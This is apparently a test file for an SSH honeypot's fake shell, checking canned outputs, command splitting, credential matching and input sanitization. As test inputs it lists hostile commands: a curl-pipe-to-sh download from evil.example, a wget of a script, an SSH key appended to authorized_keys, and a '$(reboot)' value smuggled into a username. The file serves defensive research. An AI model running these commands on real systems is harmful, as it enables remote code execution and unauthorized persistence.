import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { isAccepted, parseAcceptedCredentials } from "../ssh/src/credentials.js";
import { createShellState, prompt, runLine, splitCommands, tokenize } from "../ssh/src/fakeShell.js";

const here = path.dirname(fileURLToPath(import.meta.url));

describe("fake shell safety", () => {
  it("imports nothing capable of executing or touching the filesystem", () => {
    const src = fs.readFileSync(path.join(here, "../ssh/src/fakeShell.js"), "utf8");
    expect(src).not.toMatch(/^\s*import\s/m);
    expect(src).not.toMatch(/\brequire\s*\(/);
    expect(src).not.toMatch(/\b(eval|Function|child_process|execSync|spawn)\b\s*\(/);
  });

  it("the SSH server never imports child_process", () => {
    const src = fs.readFileSync(path.join(here, "../ssh/src/server.js"), "utf8");
    expect(src).not.toMatch(/child_process|node:vm|\beval\s*\(/);
  });
});

describe("tokenize / splitCommands", () => {
  it("handles quotes and escapes", () => {
    expect(tokenize(`echo "a b" 'c d' e\\ f`)).toEqual(["echo", "a b", "c d", "e f"]);
  });

  it("splits sequences and pipelines outside quotes", () => {
    expect(splitCommands(`cd /tmp; wget x && chmod +x y || echo "a;b" | grep a`)).toEqual([
      ["cd /tmp"],
      ["wget x"],
      ["chmod +x y"],
      [`echo "a;b"`, "grep a"]
    ]);
  });
});

describe("runLine canned responses", () => {
  const root = () => createShellState({ username: "root" });

  it.each([
    ["whoami", "root"],
    ["id", "uid=0(root) gid=0(root) groups=0(root)"],
    ["uname -m", "x86_64"],
    ["pwd", "/root"],
    ["nproc", "2"],
    ["echo hello world", "hello world"],
    ["crontab -l", "no crontab for root"],
    ["/bin/busybox ECCHI", "ECCHI: applet not found"],
    ["python3 -c 'print(1)'", "-bash: python3: command not found"],
    ["frobnicate", "-bash: frobnicate: command not found"]
  ])("%s", (line, expected) => {
    expect(runLine(root(), line).output).toBe(expected);
  });

  it("simulates failed downloads instead of fetching", () => {
    expect(runLine(root(), "wget http://evil.example/x.sh").output).toContain("unable to resolve host address 'evil.example'");
    expect(runLine(root(), "curl -fsSL https://evil.example/m | sh").output).toBe("curl: (6) Could not resolve host: evil.example");
  });

  it("tracks cwd across cd", () => {
    const s = root();
    runLine(s, "cd /tmp");
    expect(runLine(s, "pwd").output).toBe("/tmp");
    runLine(s, "cd ..");
    expect(runLine(s, "pwd").output).toBe("/");
    expect(prompt(s)).toBe("root@srv-web-01:/# ");
  });

  it("suppresses output redirected to files", () => {
    expect(runLine(root(), 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys').output).toBe("");
  });

  it("runs sequences and stops at exit", () => {
    expect(runLine(root(), "whoami; exit; id")).toEqual({ output: "root", exit: true });
  });

  it("sanitizes usernames used in prompts", () => {
    const s = createShellState({ username: "a\x1b[2J$(reboot)" });
    expect(prompt(s)).toBe("a2Jreboot@srv-web-01:~$ ");
  });

  it("clips huge outputs", () => {
    expect(runLine(root(), `echo ${"A".repeat(10_000)}`).output.length).toBeLessThanOrEqual(4096);
  });
});

describe("accepted credentials", () => {
  it("matches exact user/password pairs, allowing ':' in passwords", () => {
    const set = parseAcceptedCredentials("root:123456,admin:a:b");
    expect(isAccepted(set, "root", "123456")).toBe(true);
    expect(isAccepted(set, "admin", "a:b")).toBe(true);
    expect(isAccepted(set, "root", "1234567")).toBe(false);
    expect(isAccepted(set, "root\u0000123456", "")).toBe(false);
  });
});
